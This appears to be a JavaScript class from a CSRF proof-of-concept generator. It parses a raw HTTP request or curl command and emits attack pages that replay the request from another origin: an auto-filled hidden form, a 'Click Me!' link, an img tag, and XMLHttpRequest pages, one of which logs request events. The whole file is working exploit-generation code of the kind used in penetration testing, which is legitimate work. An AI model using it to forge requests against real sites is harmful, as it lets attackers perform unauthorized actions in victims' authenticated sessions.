class ResultBuilder {

    set request(value) { this._request = $.trim(value); }

    get request() { return this._request; }

    set dataType(value) { this._dataType = value.toUpperCase(); }

    get dataType() { return this._dataType; }

    set protocol(value) { this._protocol = value.toLowerCase(); }

    get protocol() { return (this._protocol).toUpperCase(); }

    get method() {
        if (typeof this._method !== 'undefined') return (this._method).toUpperCase();
    }

    set technique(value) { this._technique = value.toUpperCase(); }

    get technique() { return this._technique; }

    get body() { return this._body; }

    get url() { return this._url; }

    get contentType() { return this._contentType; }

    get accept() { return this._accept; }

    get acceptLanguage() { return this._acceptLanguage; }

    set httpVersion(value) { this._httpVersion = value; }

    get httpVersion() { return this._httpVersion; }

    set hostname(value) { this._hostname = value; }

    get hostname() { return this._hostname; }

    autoDetectDataType() {
        const firstWord = $.trim(this._request.split(" ")[0]).toUpperCase();

        switch (firstWord) {
            case 'CURL':
                return 'CURL';

            case 'POST':
            case 'GET':
            case 'HEAD':
            case 'PUT':
            case 'DELETE':
                return 'HTTP';

            default:
                return 'UNDEFINED';
        }
    }

    build() {

        var data = {};

        if (this.dataType == 'UNDEFINED') return '';

        switch (this.dataType) {
            case 'HTTP':
                data = this.#parseHttp();
                break;

            case 'CURL':
                data = this.#parseCurl();
                break;
        }

        data = this.#formData(data);

        let result = '';

        switch (this.technique) {
            case 'FORM':
                result = this.#createForm(data, false);
                break;

            case 'LINK':
                result = this.#createLink(data);
                break;

            case 'IMG':
                result = this.#createImg(data);
                break;

            case 'XMLHTTPREQUEST':
                result = this.#createXmlhttprequest(data);
                break;

            case 'XMLHTTPREQUESTWITHSTATS':
                result = this.#createXmlhttprequestWithStats(data);
                break;
        }

        return result;
    }

    #parseHttp() {
        let result = {};

        let headers = this.request.split("\n\n")[0].split("\n");

        result.method = headers[0].split(" ")[0].toUpperCase();

        result.httpVersion = headers[0].split(" ")[2];

        result.url = headers[0].split(" ")[1];

        let parsedUrl = this.#parseUrl(result.url);

        if (parsedUrl.host) result.url = parsedUrl.pathname + parsedUrl.search;

        headers.shift();

        result.header = {};

        jQuery.each(headers, function (index, row) {

            const header = row.split(": ");

            const name = $.trim(header[0]);

            const value = $.trim(header[1]);

            if (name && value) result.header[name] = value;
        });

        result.url = this._protocol + '://' + result.header['Host'] + result.url;

        if (typeof this.request.split("\n\n")[1] !== 'undefined') result.body = this.request.split("\n\n")[1];

        return result;
    }

    #parseCurl() {
        let result = parse_curl(this.request);
        return result;
    }

    #parseUrl(url) {
        var a = document.createElement('a');
        a.href = url;
        return a;
    }

    #formData(data) {
        this._method = data.method;

        let parsedUrl = this.#parseUrl(data.url);
        data.url = this._protocol + '://' + parsedUrl.host + parsedUrl.pathname + parsedUrl.search;

        this._body = data.body;
        this._url = data.url;
        this._httpVersion = data.httpVersion;
        this._hostname = parsedUrl.hostname;

        try { this._contentType = data.header['Content-Type']; } catch (e) { }
        try { this._accept = data.header['Accept']; } catch (e) { }
        try { this._acceptLanguage = data.header['Accept-Language']; } catch (e) { }

        if (typeof data.url !== 'undefined' && data.url !== null) data.url = data.url;
        if (typeof data.body !== 'undefined' && data.body !== null) data.body = data.body;

        return data;
    }

    #createForm(data) {

        let params;

        data.params = {};

        if (typeof data.body !== 'undefined' && data.method != 'GET') {

            params = data.body;
        } else if (typeof data.url.split('?')[1] !== 'undefined' && data.method == 'GET') {

            params = data.url.split('?')[1];

            data.url = data.url.split('?')[0];
        }

        if (typeof params !== 'undefined') {

            params = params.split('&');

            jQuery.each(params, function (index, item) {

                let name, value;

                if (typeof item.split("=")[0] !== 'undefined') { name = item.split("=")[0]; }

                if (typeof item.split("=")[1] !== 'undefined') { value = item.split("=")[1]; }

                if (!value) value = '';

                if (name) data.params[name] = decodeURIComponent(value).split('"').join('%22');
            });
        }

        let code = "";

        code += "<!DOCTYPE html>\n";
        code += "<html lang=\"en\">\n";
        code += "\t<body>\n";
        code += "\t\t<h1>Form CSRF PoC</h1>\n";
        code += "\t\t<form method=\"" + (data.method).split('"').join('%22') + "\" action=\"" + decodeURIComponent(data.url).split('"').join('%22') + "\">\n";

        Object.keys(data).forEach(function (dataKey) {

            if (dataKey == 'params') {
                Object.keys(data.params).forEach(function (key) {
                    code += "\t\t\t<input type=\"hidden\" name=\"" + key.split('"').join('%22') + "\" value=\"" + (data.params[key]).split('"').join('%22') + "\">\n";
                });
            }
        });

        code += "\t\t\t<input type=\"submit\" value=\"Submit Request\">\n";

        code += "\t\t</form>\n";

        code += "\t</body>\n";
        code += "</html>\n";

        return code;
    }

    #createLink(data) {

        let code = "";

        code += "<!DOCTYPE html>\n";
        code += "<html lang=\"en\">\n";
        code += "\t<body>\n";
        code += "\t\t<h1>Link CSRF PoC</h1>\n";
        code += "\t\t<a href=\"" + decodeURIComponent(data.url).split('"').join('%22') + "\">Click Me!</a>\n";
        code += "\t</body>\n";
        code += "</html>\n";

        return code;
    }

    #createImg(data) {

        let code = "";

        code += "<!DOCTYPE html>\n";
        code += "<html lang=\"en\">\n";
        code += "\t<body>\n";
        code += "\t\t<h1>Img CSRF PoC</h1>\n";
        code += "\t\t<img src=\"" + decodeURIComponent(data.url).split('"').join('%22') + "\">\n";
        code += "\t</body>\n";
        code += "</html>\n";

        return code;
    }

    #createXmlhttprequest(data) {

        let code = "";

        code += "<!DOCTYPE html>\n";
        code += "<html lang=\"en\">\n";
        code += "\t<body>\n";

        code += "\t\t<h1>XMLHttpRequest CSRF PoC</h1>\n";
        code += "\t\t<p style=\"color: red;\">Please reopen this window if request has new changes</p>\n";

        code += "\t\t<input type=\"submit\" value=\"Submit Request\" onclick=\"sendData();\">\n";

        code += "\n";

        code += "\t\t<script>\n";

        code += "\t\t\tfunction sendData() {\n";

        code += "\t\t\t\tvar xhr = new XMLHttpRequest();\n";

        code += "\t\t\t\txhr.open('" + decodeURIComponent(data.method).replace(/(['])/g, "\\$1") + "', '" + decodeURIComponent(data.url).replace(/(['])/g, "\\$1") + "');\n";

        if (this.contentType) code += "\t\t\t\txhr.setRequestHeader('Content-Type', '" + decodeURIComponent(this.contentType).replace(/(['])/g, "\\$1") + "');\n";

        if (this.accept) code += "\t\t\t\txhr.setRequestHeader('Accept', '" + decodeURIComponent(this.accept).replace(/(['])/g, "\\$1") + "');\n";

        if (this.acceptLanguage) code += "\t\t\t\txhr.setRequestHeader('Accept-Language', '" + decodeURIComponent(this.acceptLanguage).replace(/(['])/g, "\\$1") + "');\n";

        if (typeof data.body !== 'undefined') {
            code += "\t\t\t\txhr.send('" + (data.body).replace(/(['])/g, "\\$1") + "');\n";
        } else {
            code += "\t\t\t\txhr.send(null);\n";
        }

        code += "\t\t\t}\n";

        code += "\t\t</script>\n";

        code += "\t</body>\n";
        code += "</html>\n";

        return code;
    }

    #createXmlhttprequestWithStats(data) {

        let code = "";

        code += "<!DOCTYPE html>\n";
        code += "<html lang=\"en\">\n";
        code += "\t<body>\n";

        code += "\t\t<h1>XMLHttpRequest + Stats CSRF PoC</h1>\n";
        code += "\t\t<p style=\"color: red;\">Please reopen this window if request has new changes</p>\n";

        code += "\t\t<input type=\"submit\" value=\"Submit Request\" onclick=\"sendData();\">\n";

        code += "\n";

        code += "\t\t<!-- Listen request events -->\n";
        code += "\t\t<pre>XMLHttpRequest event list:</pre>\n";
        code += "\t\t<pre id=\"events\"></pre>\n";

        code += "\n";

        code += "\t\t<script>\n";

        code += "\t\t\t// Track request events\n";
        code += "\t\t\tfunction addListeners(xhr) {\n";
        code += "\t\t\t\txhr.addEventListener('loadstart', handleEvent);\n";
        code += "\t\t\t\txhr.addEventListener('load', handleEvent);\n";
        code += "\t\t\t\txhr.addEventListener('loadend', handleEvent);\n";
        code += "\t\t\t\txhr.addEventListener('progress', handleEvent);\n";
        code += "\t\t\t\txhr.addEventListener('error', handleEvent);\n";
        code += "\t\t\t\txhr.addEventListener('abort', handleEvent);\n";
        code += "\t\t\t}\n";

        code += "\t\t\tfunction handleEvent(e) {\n";
        code += "\t\t\tlet now = new Date();\n";
        code += "\t\t\tlet hour = now.getHours();\n";
        code += "\t\t\tlet minute = now.getMinutes();\n";
        code += "\t\t\tlet second = now.getSeconds(); \n";
        code += "\t\t\tlet millisecond = now.getMilliseconds(); \n";
        code += "\t\t\t\tdocument.querySelector('#events').insertAdjacentHTML('beforeend', '[' + hour + ':' + minute + ':' + second + '.' + millisecond + '] ' + e.type + ': ' + e.loaded + ' bytes transferred. Status: ' + e.target.status + ' ' + e.target.statusText + '<br>');\n";
        code += "\t\t\t}\n";

        code += "\n";

        code += "\t\t\t// Request init\n";

        code += "\t\t\tfunction sendData() {\n";

        code += "\t\t\t\tvar xhr = new XMLHttpRequest();\n";

        code += "\t\t\t\taddListeners(xhr);\n";

        code += "\t\t\t\txhr.open('" + decodeURIComponent(data.method).replace(/(['])/g, "\\$1") + "', '" + decodeURIComponent(data.url).replace(/(['])/g, "\\$1") + "');\n";

        if (this.contentType) code += "\t\t\t\txhr.setRequestHeader('Content-Type', '" + decodeURIComponent(this.contentType).replace(/(['])/g, "\\$1") + "');\n";

        if (this.accept) code += "\t\t\t\txhr.setRequestHeader('Accept', '" + decodeURIComponent(this.accept).replace(/(['])/g, "\\$1") + "');\n";

        if (this.acceptLanguage) code += "\t\t\t\txhr.setRequestHeader('Accept-Language', '" + decodeURIComponent(this.acceptLanguage).replace(/(['])/g, "\\$1") + "');\n";

        if (typeof data.body !== 'undefined') {
            code += "\t\t\t\txhr.send('" + (data.body).replace(/(['])/g, "\\$1") + "');\n";
        } else {
            code += "\t\t\t\txhr.send(null);\n";
        }

        code += "\t\t\t}\n";

        code += "\t\t</script>\n";

        code += "\t</body>\n";
        code += "</html>\n";

        return code;
    }
}